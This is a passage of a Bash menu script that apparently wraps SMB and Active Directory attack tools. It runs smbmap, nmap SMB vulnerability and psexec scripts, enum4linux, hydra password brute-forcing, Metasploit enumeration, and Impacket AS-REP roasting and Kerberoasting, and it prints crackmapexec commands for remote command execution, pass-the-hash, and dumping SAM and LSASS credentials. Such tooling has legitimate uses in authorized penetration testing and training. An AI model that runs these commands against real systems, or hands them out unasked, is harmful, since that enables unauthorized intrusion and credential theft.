                                                        if [[ $PORT != "" ]]
                                                        then    
                                                                clear;printf "${WHITE}Target: ${YELLOW}$IP\n\n";printf "${WHITE}Port: ${YELLOW}$PORT\n\n"
                                                                printf "${WHITE}Executing command: ${YELLOW}smbmap -H ${PURPLE}$IP${YELLOW} -u ${PURPLE}guest${YELLOW} -P ${PURPLE}$PORT${YELLOW}\n\n"
                                                                echo -e "${NC}-------------------------------------------${NC}"
                                                                smbmap -H $IP -u guest -P $PORT;printf "\n";
                                                        else
                                                                clear;printf "${WHITE}Target: ${YELLOW}$IP\n\n"
                                                                printf "${WHITE}Executing command: ${YELLOW}smbmap -H ${PURPLE}$IP${YELLOW} -u ${PURPLE}guest${YELLOW}\n\n"
                                                                echo -e "${NC}-------------------------------------------${NC}"
                                                                smbmap -H $IP -u guest;printf "\n";
            
                                                       fi;; 
                                            4)
                                                while [[ $IP == "" || $PASSWORD == "" ]]
                                                do      
                                                        printf "${WHITE}";printf "Insert Target IP Address:\n";printf "${NC}";
                                                        read -e  IP;
                                                        printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                                        printf "${WHITE}";printf "Insert Username:\n";printf "${NC}";
                                                        read -e  USERNAME;
                                                        printf "${WHITE}Password: ${YELLOW}$USERNAME${WHITE}\n\n"                                                      
                                                        printf "${WHITE}";printf "Insert Password:\n";printf "${NC}";
                                                        read -e  PASSWORD;
                                                        printf "${WHITE}Password: ${YELLOW}$PASSWORD${WHITE}\n\n"
                                                        printf "${WHITE}";printf "Insert Port(${YELLOW}ex: 139,445${WHITE}):\n";printf "${NC}";
                                                        read -e  PORT;
                                                        printf "${WHITE}Port: ${YELLOW}$PORT${WHITE}\n\n"
                                                        echo -e "${NC}-------------------------------------------${NC}\n"               
            
                                                done
                                                        if [[ $PORT != "" ]]
                                                        then    
                                                                clear;printf "${WHITE}Target: ${YELLOW}$IP\n\n";printf "${WHITE}Password: ${YELLOW}$PASSWORD\n\n";printf "${WHITE}Port: ${YELLOW}$PORT\n\n"
                                                                printf "${WHITE}Executing command: ${YELLOW}smbmap -H ${PURPLE}$IP${YELLOW} -u ${PURPLE}$USERNAME${YELLOW} -p ${PURPLE}$PASSWORD${YELLOW} -P ${PURPLE}$PORT${YELLOW}\n\n"
                                                                echo -e "${NC}-------------------------------------------${NC}"
                                                                smbmap -H $IP -u $USERNAME -p $PASSWORD-P $PORT;printf "\n";
                                                        else
                                                                clear;printf "${WHITE}Target: ${YELLOW}$IP\n\n"
                                                                printf "${WHITE}Executing command: ${YELLOW}smbmap -H ${PURPLE}$IP${YELLOW} -u ${PURPLE}$USERNAME${YELLOW} -p ${PURPLE}$PASSWORD${YELLOW}\n\n"
                                                                echo -e "${NC}-------------------------------------------${NC}"
                                                                smbmap -H $IP -u $USERNAME -p $PASSWORD;printf "\n";
            
                                                       fi;; 

                                            5)
                                                while [[ $IP == "" || $PASSWORD == "" ]]
                                                do      
                                                        printf "${WHITE}";printf "Insert Target IP Address:\n";printf "${NC}";
                                                        read -e  IP;
                                                        printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                                        printf "${WHITE}";printf "Insert Username:\n";printf "${NC}";
                                                        read -e  USERNAME;
                                                        printf "${WHITE}Password: ${YELLOW}$USERNAME${WHITE}\n\n"                                                      
                                                        printf "${WHITE}";printf "Insert Password:\n";printf "${NC}";
                                                        read -e  PASSWORD;
                                                        printf "${WHITE}Password: ${YELLOW}$PASSWORD${WHITE}\n\n"
                                                        printf "${WHITE}";printf "Insert Port(${YELLOW}ex: 139,445${WHITE}):\n";printf "${NC}";
                                                        read -e  PORT;
                                                        printf "${WHITE}Port: ${YELLOW}$PORT${WHITE}\n\n"
                                                        echo -e "${NC}-------------------------------------------${NC}\n"               
            
                                                done
                                                        if [[ $PORT != "" ]]
                                                        then    
                                                                clear;printf "${WHITE}Target: ${YELLOW}$IP\n\n";printf "${WHITE}Password: ${YELLOW}$PASSWORD\n\n";printf "${WHITE}Port: ${YELLOW}$PORT\n\n"
                                                                printf "${WHITE}Executing command: ${YELLOW}smbmap -R -H ${PURPLE}$IP${YELLOW} -u ${PURPLE}$USERNAME${YELLOW} -p ${PURPLE}$PASSWORD${YELLOW} -P ${PURPLE}$PORT${YELLOW}\n\n"
                                                                echo -e "${NC}-------------------------------------------${NC}"
                                                                smbmap -R -H $IP -u $USERNAME -p $PASSWORD-P $PORT;printf "\n";
                                                        else
                                                                clear;printf "${WHITE}Target: ${YELLOW}$IP\n\n"
                                                                printf "${WHITE}Executing command: ${YELLOW}smbmap -R -H ${PURPLE}$IP${YELLOW} -u ${PURPLE}$USERNAME${YELLOW} -p ${PURPLE}$PASSWORD${YELLOW}\n\n"
                                                                echo -e "${NC}-------------------------------------------${NC}"
                                                                smbmap -R -H $IP -u $USERNAME -p $PASSWORD;printf "\n";
            
                                                       fi;; 


                                            6)
                                                clear;
                                                printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                                printf "${WHITE}Port: ${YELLOW}$PORT${WHITE}\n\n"
                                                printf "${WHITE}Username: ${YELLOW}$USERNAME${WHITE}\n\n"
                                                printf "${WHITE}Password: ${YELLOW}$PASSWORD${WHITE}\n\n"
                                                echo -e "${NC}-------------------------------------------${NC}\n";;     
        
                                            7)
                                                clear; 
                                                printf "${WHITE}Insert Target IP:\n"${NC}
                                                read -e  IP;printf "\n"
                                                printf "${WHITE}Insert Target Port:\n"${NC}
                                                read -e  PORT;printf "\n"
                                                printf "${WHITE}Insert Username:\n"${NC}
                                                read -e  USERNAME;printf "\n" 
                                                printf "${WHITE}Insert Password:\n"${NC}
                                                read -e  PASSWORD;printf "\n" 

                                                clear;
                                                printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                                printf "${WHITE}Port: ${YELLOW}$PORT${WHITE}\n\n"
                                                printf "${WHITE}Username: ${YELLOW}$USERNAME${WHITE}\n\n"
                                                printf "${WHITE}Password: ${YELLOW}$PASSWORD${WHITE}\n\n"
                                                echo -e "${NC}-------------------------------------------${NC}\n";;         

                                            8)
                                                clear;
                                                printf "Values Cleared!\n\n"
                                                echo -e "${NC}-------------------------------------------${NC}\n"
                                                unset IP
                                                unset PORT
                                                unset USERNAME
                                                unset PASSWORD;;          

                                            0)
                                                clear;
                                                break;; 


                                        esac
                                done;;

            
                                5) 
                                    while [[ -z "$IP" ]]
                                    do
                                        printf "${WHITE}Insert Target IP Address:\n${NC}"
                                        read -e IP
                                        printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"

                                        printf "${WHITE}Insert Port (Ex:${YELLOW}139,445${WHITE}):\n${NC}"
                                        read -e PORT
                                        printf "${WHITE}Port: ${YELLOW}$PORT${WHITE}\n\n"

                                        printf "${WHITE}Insert FLAG:\n${NC}"
                                        read -e FLAG
                                        printf "${WHITE}Flag: ${YELLOW}$FLAG${WHITE}\n\n"

                                        printf "${WHITE}Insert File Name (optional):\n${NC}"
                                        read -e FILENAME
                                        printf "${WHITE}Filename: ${YELLOW}$FILENAME${WHITE}\n\n"

                                        echo -e "${NC}-------------------------------------------${NC}\n"
                                    done

                                    if [[ -n "$IP" ]]
                                    then
                                        clear
                                        printf "${WHITE}Target: ${YELLOW}$IP\n\n"

                                        if [[ -z "$PORT" ]]
                                        then
                                            PORT="139,445"
                                        fi

                                        printf "${WHITE}Port: ${YELLOW}$PORT\n\n"

                                        if [[ -n "$FILENAME" ]]
                                        then
                                            printf "${WHITE}Executing command: ${YELLOW}nmap $FLAG -p $PORT --script smb-enum-domains.nse,smb-enum-groups.nse,smb-enum-processes.nse,smb-enum-sessions.nse,smb-enum-shares.nse,smb-enum-users.nse,smb-ls.nse,smb-mbenum.nse,smb-os-discovery.nse,smb-print-text.nse,smb-psexec.nse,smb-security-mode.nse,smb-server-stats.nse,smb-system-info.nse,smb-vuln-conficker.nse,smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-regsvc-dos.nse $IP -oN /home/$USER/$FOLDER/$FILENAME${YELLOW}\n\n"
                                            echo -e "${NC}-------------------------------------------${NC}"
                                            nmap $FLAG -p $PORT --script smb-enum-domains.nse,smb-enum-groups.nse,smb-enum-processes.nse,smb-enum-sessions.nse,smb-enum-shares.nse,smb-enum-users.nse,smb-ls.nse,smb-mbenum.nse,smb-os-discovery.nse,smb-print-text.nse,smb-psexec.nse,smb-security-mode.nse,smb-server-stats.nse,smb-system-info.nse,smb-vuln-conficker.nse,smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-regsvc-dos.nse $IP -oN /home/$USER/$FOLDER/$FILENAME
                                        else
                                            printf "${WHITE}Executing command: ${YELLOW}nmap $FLAG -p $PORT --script smb-enum-domains.nse,smb-enum-groups.nse,smb-enum-processes.nse,smb-enum-sessions.nse,smb-enum-shares.nse,smb-enum-users.nse,smb-ls.nse,smb-mbenum.nse,smb-os-discovery.nse,smb-print-text.nse,smb-psexec.nse,smb-security-mode.nse,smb-server-stats.nse,smb-system-info.nse,smb-vuln-conficker.nse,smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-regsvc-dos.nse $IP${YELLOW}\n\n"
                                            echo -e "${NC}-------------------------------------------${NC}"
                                            nmap $FLAG -p $PORT --script smb-enum-domains.nse,smb-enum-groups.nse,smb-enum-processes.nse,smb-enum-sessions.nse,smb-enum-shares.nse,smb-enum-users.nse,smb-ls.nse,smb-mbenum.nse,smb-os-discovery.nse,smb-print-text.nse,smb-psexec.nse,smb-security-mode.nse,smb-server-stats.nse,smb-system-info.nse,smb-vuln-conficker.nse,smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-regsvc-dos.nse $IP
                                        fi
                                    fi;; 

                                6)

                                    while : ; do

                                    printf "${WHITE}Select An Option:${NC}\n\n"
                                    echo -e "${CYAN}1. Basic ${NC}"
                                    echo -e "${CYAN}2. Enumeration Using Creds${NC}"
                                    echo -e "${GREEN}3. Show Values ${NC}"
                                    echo -e "${GREEN}4. Set Values ${NC}"
                                    echo -e "${GREEN}5. Clear Values ${NC}"
                                    echo -e "${YELLOW}0. Back ${NC}\n"
                                    echo -n -e "${RED}Enter selection [0-5]: ${NC}"
                                    printf ${WHITE};
                                    read -e  -r enum4lin;
                                    printf "\n";clear;

                                        case $enum4lin in 

                                            1)                                             
                                                while [[ $IP == "" ]]
                                                do      
                                                        printf "${WHITE}";printf "Insert Target IP Address:\n";printf "${NC}";
                                                        read -e  IP;
                                                        printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                                        echo -e "${NC}-------------------------------------------${NC}\n"               
                                                done       
                                                        clear;printf "${WHITE}Target: ${YELLOW}$IP\n\n"
                                                        printf "${WHITE}Executing command: ${YELLOW}enum4linux -a ${PURPLE}$IP${YELLOW} \n\n"
                                                        echo -e "${NC}-------------------------------------------${NC}"
                                                        enum4linux -a $IP;printf "\n";;
                                                
                                        
                                            2)
                                                while [[ $IP == "" || $USERNAME == "" || $PASSWORD == "" ]]
                                                do      
                                                        printf "${WHITE}";printf "Insert Target IP Address:\n";printf "${NC}";
                                                        read -e  IP;
                                                        printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                                        printf "${WHITE}";printf "Insert Username:\n";printf "${NC}";
                                                        read -e  USERNAME;
                                                        printf "${WHITE}Target: ${YELLOW}$USERNAME${WHITE}\n\n"
                                                        printf "${WHITE}";printf "Insert Password:\n";printf "${NC}";
                                                        read -e  PASSWORD;
                                                        printf "${WHITE}Target: ${YELLOW}$PASSWORD${WHITE}\n\n"
                                                        echo -e "${NC}-------------------------------------------${NC}\n"               
                                                done       
                                                        clear;printf "${WHITE}Target: ${YELLOW}$IP\n\n";printf "${WHITE}Username: ${YELLOW}$USERNAME\n\n";printf "${WHITE}Password: ${YELLOW}$PASSWORD\n\n"
                                                        printf "${WHITE}Executing command: ${YELLOW}enum4linux -a -u ${PURPLE}$USERNAME${YELLOW} -p ${PURPLE}$PASSWORD${YELLOW} ${PURPLE}$IP${YELLOW} \n\n"
                                                        echo -e "${NC}-------------------------------------------${NC}"
                                                        enum4linux -a -u $USERNAME -p $PASSWORD $IP > test.txt;printf "\n"
                                                        printf "\n";;
                                                

                                            3)
                                                clear;
                                                printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                                printf "${WHITE}Username: ${YELLOW}$USERNAME${WHITE}\n\n"
                                                printf "${WHITE}Password: ${YELLOW}$PASSWORD${WHITE}\n\n"
                                                echo -e "${NC}-------------------------------------------${NC}\n";;     
        
                                            4)
                                                clear; 
                                                printf "${WHITE}Insert Target IP:\n"${NC}
                                                read -e  IP;printf "\n"
                                                printf "${WHITE}Insert Username:\n"${NC}
                                                read -e  USERNAME;printf "\n" 
                                                printf "${WHITE}Insert Password:\n"${NC}
                                                read -e  PASSWORD;printf "\n" 

                                                clear;
                                                printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                                printf "${WHITE}Username: ${YELLOW}$USERNAME${WHITE}\n\n"
                                                printf "${WHITE}Password: ${YELLOW}$PASSWORD${WHITE}\n\n"
                                                echo -e "${NC}-------------------------------------------${NC}\n";;         

                                            5)
                                                clear;
                                                printf "Values Cleared!\n\n"
                                                echo -e "${NC}-------------------------------------------${NC}\n"
                                                unset IP
                                                unset USERNAME
                                                unset PASSWORD;;          

                                            0)
                                                clear;
                                                break;;                                                 

                                        esac
                                    done;;

                                7)  
                                    echo -e "${NC}-------------------------------------------${NC}\n" 
                                    echo -e "${CYAN}1. Basic Enumeration \ncrackmapexec smb ${NC}<TARGET> \n\n${CYAN}2. Null Username \ncrackmapexec smb ${NC}<TARGET>${CYAN} --pass-pol -u '' -p '' \n\n${CYAN}3. List Shares With Null Username \ncrackmapexec smb ${NC}<TARGET>${CYAN} -u '' -p '' --shares \n\n${CYAN}4. Guest Username \ncrackmapexec smb ${NC}<TARGET>${CYAN} --pass-pol -u '${NC}guest${CYAN}' -p ''
                                    \n${CYAN}5. List Shares (With Auth) \ncrackmapexec smb ${NC}<TARGET>${CYAN} -u '' -p '' --shares | crackmapexec smb ${NC}<TARGET>${CYAN} -u ${NC}{Username}${CYAN} -p ${NC}{Password}${CYAN} --shares \n\n${CYAN}6. Enumerate Users (With Auth) \ncrackmapexec smb ${NC}<TARGET>${CYAN} --users [-u ${NC}{Username}${CYAN} -p ${NC}{Password}${CYAN}] \n\n${CYAN}7. Enumerate Groups (With Auth) \ncrackmapexec smb ${NC}<TARGET>${CYAN} --groups [-u ${NC}{Username}${CYAN} -p ${NC}{Password}${CYAN}]
                                    \n${CYAN}8. Enumerate Logged Users And Groups (With Auth) \ncrackmapexec smb ${NC}<TARGET>${CYAN} --groups --loggedon-users [-u ${NC}{Username}${CYAN} -p ${NC}{Password}${CYAN}]\n"
                                    echo -e "${CYAN}9. Execute Powershell \ncrackmapexec smb ${NC}<TARGET>${CYAN} -u ${NC}Administrator${CYAN} -p '${NC}P@ssw0rd${CYAN}' -X ${NC}$PSVersionTable${CYAN}\n"
                                    echo -e "${CYAN}10. Execute cmd \ncrackmapexec smb ${NC}<TARGET>${CYAN} -u ${NC}Administrator${CYAN} -p '${NC}P@ssw0rd${CYAN}' -x ${NC}whoami${CYAN}\n"
                                    echo -e "${CYAN}11. Pass-the-Hash \ncrackmapexec smb ${NC}<TARGET>${CYAN} -u ${NC}Administrator${CYAN} -H ${NC}<NTHASH>${CYAN} -x ${NC}whoami${CYAN}\n"
                                    echo -e "${CYAN}12. Dump SAM  \ncrackmapexec smb ${NC}<TARGET>${CYAN} -d ${NC}<DOMAIN>${CYAN} -u ${NC}Administrator${CYAN} -p '${NC}P@ssw0rd${CYAN}' --sam\n"
                                    echo -e "${CYAN}14. Dump LSASS in memmory hashes \ncrackmapexec smb ${NC}<TARGET>${CYAN} -d ${NC}<DOMAIN>${CYAN} -u ${NC}Administrator${CYAN} -p '${NC}P@ssw0rd${CYAN}' --lsa\n"
                                    echo -e "${CYAN}15. Get sessions \ncrackmapexec smb ${NC}<TARGET>${CYAN} -d ${NC}<DOMAIN>${CYAN} -u ${NC}Administrator${CYAN} -p '${NC}P@ssw0rd${CYAN}' --sessions\n"
                                    echo -e "${CYAN}16. Get logged-on users \ncrackmapexec smb ${NC}<TARGET>${CYAN} -d ${NC}<DOMAIN>${CYAN} -u ${NC}Administrator${CYAN} -p '${NC}P@ssw0rd${CYAN}' --loggedon-users\n"
                                    echo -e "${CYAN}17. Enumerate the disks \ncrackmapexec smb ${NC}<TARGET>${CYAN} -d ${NC}<DOMAIN>${CYAN} -u ${NC}Administrator${CYAN} -p '${NC}P@ssw0rd${CYAN}' --disks\n"
                                    echo -e "${CYAN}18. Enumerate local groups \ncrackmapexec smb ${NC}<TARGET>${CYAN} -d ${NC}<DOMAIN>${CYAN} -u ${NC}Administrator${CYAN} -p '${NC}P@ssw0rd${CYAN}' --local-groups\n"
                                    echo -e "${CYAN}19. Get password policy \ncrackmapexec smb ${NC}<TARGET>${CYAN} -d ${NC}<DOMAIN>${CYAN} -u ${NC}Administrator${CYAN} -p '${NC}P@ssw0rd${CYAN}' --pass-pol\n"
                                    echo -e "${CYAN}20. RID brute \ncrackmapexec smb ${NC}<TARGET>${CYAN} -d ${NC}<DOMAIN>${CYAN} -u ${NC}Administrator${CYAN} -p '${NC}P@ssw0rd${CYAN}' --rid-brute\n"
                                    echo -e "${CYAN}21. Pass-the-Hash \ncrackmapexec smb ${NC}<TARGET>${CYAN} -d ${NC}<DOMAIN>${CYAN} -u ${NC}Administrator${CYAN} -H '${NC}HASH${CYAN}'\n"
                                    echo -e "${NC}-------------------------------------------${NC}\n";;

                                8) 
                                    while [[ $IP == "" || $PASSWORDLIST == "" || $USERNAME == "" ]]
                                    do      
                                            printf "${WHITE}";printf "Insert Target IP Address:\n";printf "${NC}";
                                            read -e  IP;
                                            printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                            printf "${WHITE}";printf "Insert Username:\n";printf "${NC}";
                                            read -e  USERNAME;
                                            printf "${WHITE}Username: ${YELLOW}$USERNAME${WHITE}\n\n"
                                            printf "${WHITE}";printf "Insert Passwords List:\n";printf "${NC}";
                                            read -e  PASSWORDLIST;
                                            printf "${WHITE}Password List: ${YELLOW}$PASSWORDLIST${WHITE}\n\n"                                                      
                                            echo -e "${NC}-------------------------------------------${NC}\n"               
            
                                      done
                                            clear;printf "${WHITE}Target: ${YELLOW}$IP\n\n";printf "${WHITE}Username: ${YELLOW}$USERNAME${WHITE}\n\n";printf "${WHITE}Password List: ${YELLOW}$PASSWORDLIST${WHITE}\n\n";
                                            printf "${WHITE}Executing command: ${YELLOW}hydra -t 1 -V -f -l ${PURPLE}$USERNAME${YELLOW} -P ${PURPLE}$PASSWORDLIST${YELLOW} ${PURPLE}$IP${YELLOW} smb\n\n"
                                            echo -e "${NC}-------------------------------------------${NC}"
                                            hydra -t 1 -V -f -l $USERNAME -P $PASSWORDLIST $IP smb;printf "\n";; 

                                9) 
                                            while [[ $IP == "" ]]
                                            do      
                                                    printf "${WHITE}";printf "Insert Target IP:\n";printf "${NC}";
                                                    read -e  IP;
                                                    printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                                    echo -e "${NC}-------------------------------------------${NC}\n"               

                                            done
                                                    clear;printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                                    printf "${WHITE}Executing ${PURPLE}MetaSploit Users & Share ${NC}Enumeration\n\n"
                                                    echo -e "${NC}-------------------------------------------${NC}"
                                                    msfconsole -q -x "use auxiliary/scanner/smb/smb_enumusers; set RHOSTS $IP; run; exit" && msfconsole -q -x "use auxiliary/scanner/smb/smb_enumshares; set RHOSTS $IP; run; exit"; printf "\n";;                                    


                                10) 
                                    while : ; do

                                    printf "${WHITE}Select A Tool:${NC}\n\n"
                                    echo -e "${CYAN}1. GetADUsers ${NC}"
                                    echo -e "${CYAN}2. GetNPUsers${NC}"
                                    echo -e "${CYAN}3. GetUserSPNs${NC}"
                                    echo -e "${CYAN}4. getArch${NC}"
                                    echo -e "${GREEN}5. Show Values ${NC}"
                                    echo -e "${GREEN}6. Set Values ${NC}"
                                    echo -e "${GREEN}7. Clear Values ${NC}"
                                    echo -e "${YELLOW}0. Back ${NC}\n"
                                    echo -n -e "${RED}Enter selection [0-7]: ${NC}"
                                    printf ${WHITE};
                                    read -e  -r impacket;
                                    printf "\n";clear;

                                        case $impacket in 

                                            1) 
                                                while [[ $IP == "" || $DOMAINHOST == "" ]]
                                                do      
                                                        printf "${WHITE}";printf "Insert Target IP Address:\n";printf "${NC}";
                                                        read -e  IP;
                                                        printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                                        printf "${WHITE}";printf "Insert Domain:\n";printf "${NC}";
                                                        read -e  DOMAINHOST;
                                                        printf "${WHITE}Domain: ${YELLOW}$DOMAINHOST${WHITE}\n\n"
                                                        printf "${WHITE}";printf "Insert Username:\n";printf "${NC}";
                                                        read -e  USERNAME;
                                                        printf "${WHITE}Username: ${YELLOW}$USERNAME${WHITE}\n\n"
                                                        printf "${WHITE}";printf "Insert Password:\n";printf "${NC}";
                                                        read -e  PASSWORD;
                                                        printf "${WHITE}Password: ${YELLOW}$PASSWORD${WHITE}\n\n"
                                                        echo -e "${NC}-------------------------------------------${NC}\n"               

                                                done

                                                if [[ $USERNAME == "" && $PASSWORD == "" ]]
                                                then    
                                                        clear;printf "${WHITE}Target: ${YELLOW}$IP\n\n";printf "${WHITE}Domain: ${YELLOW}$DOMAINHOST\n\n";printf "${WHITE}Username: ${YELLOW}$USERNAME${WHITE}\n\n";printf "${WHITE}Password: ${YELLOW}$PASSWORD\n\n"
                                                        printf "${WHITE}Executing command: ${YELLOW}GetADUsers.py -dc-ip $IP "$DOMAINHOST/" -all\n\n"
                                                        echo -e "${NC}-------------------------------------------${NC}"
                                                        GetADUsers.py -dc-ip $IP "$DOMAINHOST/" -all;printf "\n";
                                                        printf "\n";
                                                else
                                                        clear;printf "${WHITE}Target: ${YELLOW}$IP\n\n";printf "${WHITE}Domain: ${YELLOW}$DOMAINHOST\n\n";printf "${WHITE}Username: ${YELLOW}$USERNAME${WHITE}\n\n";printf "${WHITE}Password: ${YELLOW}$PASSWORD\n\n"
                                                        printf "${WHITE}Executing command: ${YELLOW}GetADUsers.py ${PURPLE}$DOMAINHOST/$USERNAME:$PASSWORD${YELLOW} -all\n\n"
                                                        echo -e "${NC}-------------------------------------------${NC}"
                                                        GetADUsers.py $DOMAINHOST/$USERNAME:$PASSWORD -all;printf "\n";
                                                        printf "\n";
                                                fi;; 

                                            2) 
                                                while [[ $IP == "" || $DOMAINHOST == "" ]]
                                                do      
                                                        printf "${WHITE}";printf "Insert Target IP Address:\n";printf "${NC}";
                                                        read -e  IP;
                                                        printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                                        printf "${WHITE}";printf "Insert Domain:\n";printf "${NC}";
                                                        read -e  DOMAINHOST;
                                                        printf "${WHITE}Domain: ${YELLOW}$DOMAINHOST${WHITE}\n\n"
                                                        printf "${WHITE}";printf "Insert Username:\n";printf "${NC}";
                                                        read -e  USERNAME;
                                                        printf "${WHITE}Username: ${YELLOW}$USERNAME${WHITE}\n\n"
                                                        printf "${WHITE}";printf "Insert Password:\n";printf "${NC}";
                                                        read -e  PASSWORD;
                                                        printf "${WHITE}Password: ${YELLOW}$PASSWORD${WHITE}\n\n"
                                                        echo -e "${NC}-------------------------------------------${NC}\n"               

                                                done

                                                if [[ $USERNAME == "" && $PASSWORD == "" ]]
                                                then    
                                                        clear;printf "${WHITE}Target: ${YELLOW}$IP\n\n";printf "${WHITE}Domain: ${YELLOW}$DOMAINHOST\n\n";printf "${WHITE}Username: ${YELLOW}$USERNAME${WHITE}\n\n";printf "${WHITE}Password: ${YELLOW}$PASSWORD\n\n"
                                                        printf "${WHITE}Executing command: ${YELLOW}GetNPUsers.py -dc-ip ${PURPLE}$IP${YELLOW} -request ${PURPLE}"$DOMAINHOST/"${YELLOW} -format ${PURPLE}hashcat${YELLOW}\n\n"
                                                        echo -e "${NC}-------------------------------------------${NC}"
                                                        GetNPUsers.py -dc-ip $IP -request "$DOMAINHOST/" -format hashcat;printf "\n";                                                      
                                                        printf "\n";
                                                else
                                                        clear;printf "${WHITE}Target: ${YELLOW}$IP\n\n";printf "${WHITE}Domain: ${YELLOW}$DOMAINHOST\n\n";printf "${WHITE}Username: ${YELLOW}$USERNAME${WHITE}\n\n";printf "${WHITE}Password: ${YELLOW}$PASSWORD\n\n"
                                                        printf "${WHITE}Executing command: ${YELLOW}GetNPUsers.py ${PURPLE}$DOMAINHOST/$USERNAME:$PASSWORD${YELLOW} -request -format ${PURPLE}hashcat${YELLOW}\n\n"
                                                        echo -e "${NC}-------------------------------------------${NC}"
                                                        GetNPUsers.py $DOMAINHOST/$USERNAME:$PASSWORD -request -format hashcat ;printf "\n";
                                                        printf "\n";
                                                fi;; 

                                            3) 
                                                while [[ $IP == "" || $DOMAINHOST == "" ]]
                                                do      
                                                        printf "${WHITE}";printf "Insert Target IP Address:\n";printf "${NC}";
                                                        read -e  IP;
                                                        printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                                        printf "${WHITE}";printf "Insert Domain:\n";printf "${NC}";
                                                        read -e  DOMAINHOST;
                                                        printf "${WHITE}Domain: ${YELLOW}$DOMAINHOST${WHITE}\n\n"
                                                        printf "${WHITE}";printf "Insert Username:\n";printf "${NC}";
                                                        read -e  USERNAME;
                                                        printf "${WHITE}Username: ${YELLOW}$USERNAME${WHITE}\n\n"
                                                        printf "${WHITE}";printf "Insert Password:\n";printf "${NC}";
                                                        read -e  PASSWORD;
                                                        printf "${WHITE}Password: ${YELLOW}$PASSWORD${WHITE}\n\n"
                                                        echo -e "${NC}-------------------------------------------${NC}\n"               
                                                done

                                                if [[ $USERNAME == "" && $PASSWORD == "" ]]
                                                then    
                                                        clear;printf "${WHITE}Target: ${YELLOW}$IP\n\n";printf "${WHITE}Domain: ${YELLOW}$DOMAINHOST\n\n";printf "${WHITE}Username: ${YELLOW}$USERNAME${WHITE}\n\n";printf "${WHITE}Password: ${YELLOW}$PASSWORD\n\n"
                                                        printf "${WHITE}Executing command: ${YELLOW}GetUserSPNs.py -dc-ip ${PURPLE}$IP${YELLOW} -request ${PURPLE}"$DOMAINHOST/"${YELLOW}\n\n"
                                                        echo -e "${NC}-------------------------------------------${NC}"
                                                        GetUserSPNs.py -dc-ip $IP -request "$DOMAINHOST/";printf "\n";                                                      
                                                        printf "\n";
                                                else
                                                        clear;printf "${WHITE}Target: ${YELLOW}$IP\n\n";printf "${WHITE}Domain: ${YELLOW}$DOMAINHOST\n\n";printf "${WHITE}Username: ${YELLOW}$USERNAME${WHITE}\n\n";printf "${WHITE}Password: ${YELLOW}$PASSWORD\n\n"
                                                        printf "${WHITE}Executing command: ${YELLOW}GetUserSPNs.py ${PURPLE}$DOMAINHOST/$USERNAME:$PASSWORD${YELLOW} -request \n\n"
                                                        echo -e "${NC}-------------------------------------------${NC}"
                                                        GetUserSPNs.py $DOMAINHOST/$USERNAME:$PASSWORD -request;printf "\n";
                                                        printf "\n";
                                                fi;; 

                                            4)  while [[ $IP == "" ]]
                                                do      
                                                        printf "${WHITE}";printf "Insert Target IP Address:\n";printf "${NC}";
                                                        read -e  IP;
                                                        printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                                        echo -e "${NC}-------------------------------------------${NC}\n"               
                                                done        
                                                        clear;printf "${WHITE}Target: ${YELLOW}$IP\n\n"
                                                        printf "${WHITE}Executing command: ${YELLOW}getArch.py -target ${PURPLE}$IP${YELLOW} \n\n"
                                                        echo -e "${NC}-------------------------------------------${NC}"
                                                        getArch.py -target $IP;printf "\n";;
                                                

                                            5)
                                                clear;
                                                printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                                printf "${WHITE}Domain: ${YELLOW}$DOMAINHOST${WHITE}\n\n"
                                                printf "${WHITE}Username: ${YELLOW}$USERNAME${WHITE}\n\n"
                                                printf "${WHITE}Password: ${YELLOW}$PASSWORD${WHITE}\n\n"
                                                echo -e "${NC}-------------------------------------------${NC}\n";;     
        
                                            6)
                                                clear; 
                                                printf "${WHITE}Insert Target IP:\n"${NC}
                                                read -e  IP;printf "\n"
                                                printf "${WHITE}Insert Domain:\n"${NC}
                                                read -e  DOMAINHOST;printf "\n"                                               
                                                printf "${WHITE}Insert Username:\n"${NC}
                                                read -e  USERNAME;printf "\n" 
                                                printf "${WHITE}Insert Password:\n"${NC}
                                                read -e  PASSWORD;printf "\n" 

                                                clear;
                                                printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                                printf "${WHITE}Domain: ${YELLOW}$DOMAINHOST${WHITE}\n\n"
                                                printf "${WHITE}Username: ${YELLOW}$USERNAME${WHITE}\n\n"
                                                printf "${WHITE}Password: ${YELLOW}$PASSWORD${WHITE}\n\n"
                                                echo -e "${NC}-------------------------------------------${NC}\n";;         

                                            7)
                                                clear;
                                                printf "Values Cleared!\n\n"
                                                echo -e "${NC}-------------------------------------------${NC}\n"
                                                unset IP
                                                unset DOMAINHOST
                                                unset USERNAME
